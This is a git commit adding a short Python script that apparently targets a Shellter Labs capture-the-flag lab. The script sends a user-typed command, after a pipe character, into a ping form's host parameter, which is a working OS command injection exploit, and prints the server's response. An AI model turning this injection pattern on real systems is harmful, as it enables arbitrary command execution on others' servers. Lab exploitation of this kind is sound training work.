95cb1ac122707464d2b45dd98d97f3b0c4ecb01a
Thiago Sena <thiagosenaribeiro@outlook.com>
2017-07-26 13:04:14 -0300

    Add files via upload

---
+++ command.py
@@ -0,0 +1,13 @@
+# Author: Thiago (THX)
+# github: /thxsena
+#
+#
+
+import requests
+
+escolha = raw_input('Command: ')
+
+r = requests.get('http://lab.shellterlabs.com:33361/index.php?host=192.168.0.1 |'+ escolha +'&submit=Ping%21')
+
+print r.text
+
